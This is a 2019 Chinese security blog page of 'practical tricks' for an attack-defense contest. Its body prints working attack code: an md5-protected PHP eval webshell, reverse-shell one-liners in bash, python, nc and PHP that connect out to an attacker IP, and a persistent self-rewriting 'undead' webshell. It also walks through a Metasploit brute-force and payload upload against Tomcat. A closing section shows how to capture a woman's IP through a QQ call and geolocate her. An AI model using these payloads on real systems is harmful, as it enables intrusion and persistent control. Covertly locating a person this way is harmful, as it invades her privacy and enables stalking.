@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <link rel="canonical" href="https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/">
+    
+    
+    <title>实战中可能会用到的几个技巧 | Anti-entropy&#39;s blog | 向一切虚伪的美好宣战</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="awd,不死马,反弹shell,metasploit,linux权限控制">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":null,"app_id":"falsee1f779yetMaV1lNERajntYJH-gzGzoHsz","app_key":"CGROdujMx4Hw9l84Eysyhp7D","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"w6aWfPRvBTtEbBcUQVnWa1fl-MdYXbMMI","appkey":"96PaRwN0DWkNUdwQrWx3Ff7g","notify":true,"verify":true,"placeholder":"来和希儿一起玩吧 -- 记得告诉希儿你的昵称和邮箱哟","avatar":"retro"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?85ac030db207eb5660d0fd7b00b2205d";
+          var s = document.getElementsByTagName("script")[0]; 
+          s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+    
+        <!-- live2d css -->
+        <style>
+            .live2d-widget-dialog-container {
+                width: 300px;
+                height: 120px;
+                position: absolute;
+                bottom: 65%;
+                right: 0px;
+                transform-origin: right;
+                padding: 12px;
+                box-sizing: border-box;
+                -webkit-font-smoothing: antialiased;
+            }
+            .live2d-widget-dialog {
+                width: 100%;
+                height: 100%;
+                color: #917159;
+                font-size: 16px;
+                padding: 12px;
+                border: 2px solid rgb(236, 203, 180);
+                background: rgb(252, 248, 244);
+                box-sizing: border-box;
+                border-radius: 10px;
+                transform: rotate(-2deg);
+                opacity: 0;
+                transition: 200ms opacity;
+                box-shadow: rgba(0, 0, 0, 0.12) 0px 1px 6px, rgba(0, 0, 0, 0.12) 0px 1px 4px;
+                animation: live2d-widget-dialog-tingle 4s ease-in-out 0s infinite alternate;
+            }
+            @keyframes live2d-widget-dialog-tingle {
+                0% { transform: translate(-1px, 1.5px) rotate(-2deg); }
+                100% { transform: translate(1px, -1.5px) rotate(2deg); }
+            }
+        </style>
+    
+        <!--- live2d js -->
+        <script src="http://188.131.227.20:999/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script>
+        <script>L2Dwidget.init({"pluginRootPath":"http://188.131.227.20:999/live2dw/","pluginJsPath":"http://188.131.227.20:999/lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/Epsilon2.1.model.json"},"display":{"position":"right","width":300,"height":400},"mobile":{"show":false},"log":false});</script>
+        <div id="live2d-widget" class="live2d-widget-container" style="position: fixed; right: 0px; bottom: -20px; width: 300px; height: 400px; z-index: 99999; opacity: 1; pointer-events: none;"><canvas id="live2dcanvas" width="600" height="800" style="position: absolute; left: 0px; top: 0px; width: 300px; height: 400px;"></canvas></div>
+        <script>
+            var imageArr=[];
+        </script>
+        
+</head>
+
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Anti-entropy</h5>
+          <a href="mailto:1348651580@qq.com" title="1348651580@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>3</span>
+            
+              <span>4</span>
+            
+              <span>8</span>
+            
+              <span>6</span>
+            
+              <span>5</span>
+            
+              <span>1</span>
+            
+              <span>5</span>
+            
+              <span>8</span>
+            
+              <span>0</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/anti-entropy123/" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                文章
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>实战中可能会用到的几个技巧</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">实战中可能会用到的几个技巧</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-07-29T08:39:02.000Z" itemprop="datePublished" class="page-time">
+  2019-07-29
+</time>
+
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-实战中可能会用到的技巧"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">实战中可能会用到的几个技巧</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-07-29 16:39:02" datetime="2019-07-29T08:39:02.000Z"  itemprop="datePublished">2019-07-29</time>
+
+            
+
+
+            
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2019/07/29/实战中可能会用到的技巧/#comment">
+            <span class="valine-comment-count" data-xid="/2019/07/29/实战中可能会用到的技巧/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="实战中可能会用到的几个技巧"><a href="#实战中可能会用到的几个技巧" class="headerlink" title="实战中可能会用到的几个技巧"></a>实战中可能会用到的几个技巧</h1><a id="more"></a>
+<p>还有半个多月蓝帽杯就要开始了, 真的瑟瑟发抖. 估计要被虐菜.<br>唉, 实在不行就当北京一日游了QAQ.</p>
+<h2 id="md5-加密一句话木马"><a href="#md5-加密一句话木马" class="headerlink" title="md5 加密一句话木马"></a>md5 加密一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 密码: a='youjianing' &amp; b</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'a'</span>]) == <span class="string">'a4e8129c8cf66411c82c9a02fa08d223'</span>)&#123;</span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'b'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过一层md5加密, 使得木马的安全性大大提高.<br>值得注意的是实战中需要找到足够安全的MD5密文.<br>顺便在这几次试验中确认, index是否被<code>&#39; &#39; 或 &quot; &quot;</code>包裹无影响. (没有系统学过PHP伤不起, 一到这种细节的地方就容易犯嘀咕) </p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="出处"><a href="#出处" class="headerlink" title="出处"></a>出处</h3><p>本来是想好好整理出自己的文章的, 但是<a href="https://www.jianshu.com/p/6aca9b29514d" target="_blank" rel="noopener">这篇博客</a>我觉得已经把基本的方法罗列的很清楚, 写的足够好了. </p>
+<h3 id="linux命令反弹shell"><a href="#linux命令反弹shell" class="headerlink" title="linux命令反弹shell"></a>linux命令反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span><br></pre></td></tr></table></figure>
+
+<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.1.146 7777</span><br></pre></td></tr></table></figure>
+
+<h3 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h3><h4 id="php的exec函数反弹"><a href="#php的exec函数反弹" class="headerlink" title="php的exec函数反弹"></a>php的<code>exec函数</code>反弹</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r 'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.146/7777");'</span><br></pre></td></tr></table></figure>
+
+<h4 id="php的fsockopen远程连接"><a href="#php的fsockopen远程连接" class="headerlink" title="php的fsockopen远程连接"></a>php的<code>fsockopen</code>远程连接</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></pre></td></tr></table></figure>
+
+<h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><h3 id="制作不死马"><a href="#制作不死马" class="headerlink" title="制作不死马"></a>制作不死马</h3><p>在awd中, 经过混淆的一句话木马虽然能提供可使用的shell, 但是容易被服务器管理者发现并删除, 这不利于权限的维持.<br>不死马(也叫内存马), 一旦在目标主机中运行就无法通过一般的方法删除, 这对我们持续持有权限是极有帮助的.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 摘自 https://www.jianshu.com/p/3cd8cc491b54</span></span><br><span class="line"><span class="comment"># ?pass=pass&amp;</span></span><br><span class="line"><span class="comment"># 密码 ?pass=pass &amp; a</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'2.php'</span>;</span><br><span class="line">$code = <span class="string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>ignore_user_abort($setting)</code>:<br>  函数设置与客户机断开是否会终止脚本的执行.<br>  setting: 可选。如果设置为 true，则忽略与用户的断开，如果设置为 false，(与用户的断开)会导致脚本停止运行。如果未设置该参数，会返回当前的设置。</li>
+<li><code>set_time_limit($time)</code>:<br>  设置脚本的最大运行时间, 如果$time=0, 则不限制时间.</li>
+<li><code>unlink($file)</code>:<br>  删除文件. <code>$file=__FILE__</code>, 则删除脚本自身.</li>
+<li><code>file_put_contents($file,$code)</code>:<br>  将字符串<code>$code</code>写入文件<code>$file</code>中.</li>
+<li><code>usleep($time)</code>:<br>  暂停<code>$time</code>(毫秒), 与<code>sleep($time)</code>唯一的区别为单位, sleep()为秒.</li>
+</ul>
+<p>此处code写入的是上文提到的加密过的一句话木马, 可以根据需要自行修改.</p>
+<p>目前脚本在Windows下, 使用<code>VScode</code>的<code>run code</code>可以成功运行并实现”不死”, 也可以通过web服务, 使用浏览器访问使之运行.<br>不过在linux下, 包括Ubuntu和kali系统, 我都无法通过浏览器访问的方式让脚本运行, 只能用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php ./不死马.php</span><br></pre></td></tr></table></figure>
+
+<p>来运行 <del>, 这一点还不知道为什么.</del><br><del>希望dalao们能指点迷津.</del></p>
+<p>嗯, 在<a href="https://www.tjuscswyz.cn/" target="_blank" rel="noopener">p4ssw0rd</a>学长的鼎力支持下, 我基本搞明白怎么回事了.<br><strong>再次感谢学长</strong></p>
+<h3 id="上述异常的原因和解决办法"><a href="#上述异常的原因和解决办法" class="headerlink" title="上述异常的原因和解决办法"></a>上述异常的原因和解决办法</h3><p>我们在<code>linux</code>(包括<code>ubuntu</code>和<code>kali</code>)下没办法用浏览器连接启动的原因, 其实是权限问题.<br>当我把不死马(<code>buisma.php</code>)放在web目录下然后访问, 浏览器会表示正在加载, 可是回过头来看.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>如果正常运行的话, 不死马文件本身是要被删除的. 可是<code>busima.php</code>既没有被删除, 也没有创建<code>2.php</code>这个文件.<br>其实问题就出在这里. 我们知道<code>linux</code>的每个文件和目录都有权限控制. 如果用<code>ls -al</code>查看某个目录或者文件, 最前面会显示出权限控制信息, 通常为类似下面这段代码.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwxrwxr-x 2 ubuntu ubuntu     4096  Jul  30  20:09 test</span><br></pre></td></tr></table></figure>
+
+<p>这是什么意思呢?</p>
+<blockquote>
+<p>首先d表示这个文件是一个文件夹，然后文件的权限一共有9个字符表示，分成三组，分别表示文件所属用户的权限，文件所属用户组的权限，其他人的权限，r 表示读权限, w表示写权限， x表示执行权限.<br>From : <a href="https://zhidao.baidu.com/question/294587410.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/294587410.html</a></p>
+</blockquote>
+<p>按照我们的例子就是: </p>
+<ul>
+<li><code>test</code>是一个目录</li>
+<li>所属用户拥有读写执行, 所属用户组拥有读写执行权限, 其它用户拥有读执行权限, 没有写入权限.</li>
+<li>所属用户为ubuntu, 所属用户组为ubuntu</li>
+</ul>
+<p>如果我们使用web服务来使其运行, 那么就是以www-data用户执行, 它属于其它用户, 没有写入权限.<br>而之前提到的删除正需要写入权限, 自然程序到这里就没法继续执行了.<br>事实是否如此, 我们可以验证下. </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:/var/www/html$ chmod test 777</span><br><span class="line">ubuntu@VM-0-3-ubuntu:/var/www/html$ ls -al "test"</span><br><span class="line">total 16</span><br><span class="line">drwxrwxrwx  2 ubuntu   ubuntu   4096 Jul 31 14:33 .</span><br><span class="line">(略)</span><br></pre></td></tr></table></figure>
+
+<p>浏览器访问, 不死马直接运行, 没得毛病!</p>
+<h3 id="杀死不死马"><a href="#杀死不死马" class="headerlink" title="杀死不死马"></a>杀死不死马</h3><p>因为不死马已经被写进内存中不断写<code>webshell</code>, 所以只删除<code>webshell</code>没有任何意义. 必须终止不死马的进程.<br>如果是拥有管理员权限的情况下, 直接关掉<code>apache2</code>服务是最直接的, 因为不死马是在它的子进程下.<br>不过比赛中一般都是低权限用户, 没法直接关闭<code>apache2</code>服务. 但也可以用下面的方法杀不死马.<br>用蚁剑或菜刀连上自己留的<code>webshell</code>(相当于登录<code>www-data</code>用户), 然后在终端输入命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall -u www-data</span><br></pre></td></tr></table></figure>
+
+<p>kill 所有<code>www-data</code>用户下的进程(当然也包括<code>busima</code>). 很巧的是, 那些root的服务, 我们权限不够, kill 不了, 自然不会让服务挂掉.</p>
+<h2 id="metasploit一次实战"><a href="#metasploit一次实战" class="headerlink" title="metasploit一次实战"></a>metasploit一次实战</h2><ol start="0">
+<li><p>为什么要记录这次?<br>因为这次是我第一次比较正式的使用<code>metasploit</code>, 也真正的见识到了它的强大, 我相信这个工具将来还会扮演更重要的角色.<br>除此之外, 这个靶机位于国外, 需要科学上网, 所以如果将来想要复现还比较麻烦, 不如干脆详细的记录一下. 供将来的自己参照查看.</p>
+</li>
+<li><p>首先查看自己的ip和子网ip, 这是所有步骤的开始.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/ipconfig.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/ipconfig.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>获取了子网的ip地址后, 我们知道靶机就在这个子网中, 所以可以用Nmap扫出靶机的位置.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/nmapsubnet.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/nmapsubnet.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>靶机IP为<code>192.68.149.3</code></p>
+</li>
+<li><p>这个时候如果直接用浏览器访问是访问不到的. 因为我们还不知道它的http端口是多少(默认大多为80或8080). 我们还需要更详细的信息.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/nmapA.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/nmapA.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>再次访问<code>192.68.149.3:8080</code>就能访问web服务了. 下面就用这次的主角<code>metasploit</code>针对<code>tomcat</code>的漏洞进行攻击.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/search.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/search.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>我们选用tomcat_mgr_login这个漏洞来尝试获得后台的账户和密码.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/use1.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/use1.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>查看相关的参数</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/options1.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/options1.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>设置参数. 包括靶机的ip和端口, 使用的账户名和密码字典.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/set1.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/set1.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>设置完成后就可以开始漏洞利用了.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/exploit11.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/exploit11.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>成功爆破出了我们要的东西.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/exploit12.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/exploit12.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>用浏览器尝试下能不能登陆后台.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/webbrowser1.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/webbrowser1.png" alt title class></a>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/webbrowser2.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/webbrowser2.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>没有问题!</p>
+</li>
+<li><p>下面再用第二个漏洞来获取shell.<br>这次我们用tomcat_mgr_upload, 并查看参数.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/useandset.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/useandset.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>设置好后就开始漏洞利用.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/exploit2.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/exploit2.png" alt title class></a>
+                <p></p>
+            </figure></li>
+<li><p>下面是成功后的效果.</p>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/meterpreter.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/meterpreter.png" alt title class></a>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <a rel=实战中可能会用到的几个技巧 href="http://188.131.227.20:999/picture/operatarget.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/operatarget.png" alt title class></a>
+                <p></p>
+            </figure>
+<p>可以看到这里的<code>meterpreter</code>和真正的shell还是有所区别的.<br>值得注意的一点, 可以用下面的命令来使用python调出shell.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c "import pty;pty.spawn('/bin/sh')"</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>完.<br><del>头一次截了这么多图, 真鸡儿累.</del><br><del>抱歉, 图被无良七牛云吞了, 有生之年可能会找回来.</del><br><del>还好当时是用QQ截的图, 缓存在QQ里了, 哈哈哈</del></p>
+<h2 id="用QQ获取女神的IP"><a href="#用QQ获取女神的IP" class="headerlink" title="用QQ获取女神的IP"></a>用QQ获取女神的IP</h2><p>某个寂寞的夜晚, 我又想起我的女神.<br>女神啊, 你现在在何方?<br>马上就能知道.<br>.<br>.<br>.<br>这边打开着<code>wireshark</code>, 开始抓包.<br>拿起手机, 打开女神的qq聊天框, 丢过去个qq电话.<br>大概过个几秒(时间把握好, 别让女神接了电话…哈哈哈).<br>回到<code>wireshark</code>这, 停止抓包.</p>
+</li>
+</ol>
+<p>Ctrl+F, 设置为<strong>字符串</strong>和<strong>分组详情</strong>.<br>然后在框里输入<code>020048</code>, 就能找到女神的IP地址了<br>这串代码应该是QQ电话的请求的二进制码的一部分.</p>
+<p>效果:</p>
+<p><del>图没了 QAQ</del></p>
+<p>于是我拿着女神的IP尝试着定位了一下, 感觉没什么异常, <font color="green">就安心了</font>.</p>
+<p>完.<br>好吧, 这和实战没啥关系, 就是觉得好玩. 而且也很简单.</p>
+<p><a href="https://blog.csdn.net/qq78069460/article/details/79153958" target="_blank" rel="noopener">详细过程</a></p>
+<h2 id="感慨"><a href="#感慨" class="headerlink" title="感慨"></a>感慨</h2><p>接触网络安全越久, 发现自己的未知面就越广.<br>觉得自己要学的东西还有太多.<br><strong>不过我不想急于求成, 惟愿每天都有所收获.</strong></p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-09-08T15:07:41.359Z" itemprop="dateUpdated">2019-09-08 23:07:41</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/07/29/实战中可能会用到的技巧/" target="_blank" rel="external">https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/</a>
+        
+    </div>
+    <footer>
+        <a href="https://tjuyjn.top">
+            <img src="/img/avatar.jpg" alt="Anti-entropy">
+            Anti-entropy
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/awd/">awd</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux权限控制/">linux权限控制</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/metasploit/">metasploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/不死马/">不死马</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/反弹shell/">反弹shell</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/&title=《实战中可能会用到的几个技巧》 — Anti-entropy's blog&pic=https://tjuyjn.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/&title=《实战中可能会用到的几个技巧》 — Anti-entropy's blog&source=实战中可能会用到的几个技巧" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《实战中可能会用到的几个技巧》 — Anti-entropy's blog&url=https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/&via=https://tjuyjn.top" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/08/14/xss-csrf学习/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Pikachu 漏洞练习平台</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2019/07/19/当你用python给女神刷赞会发生什么/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">用python给女神刷赞会发生什么？</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
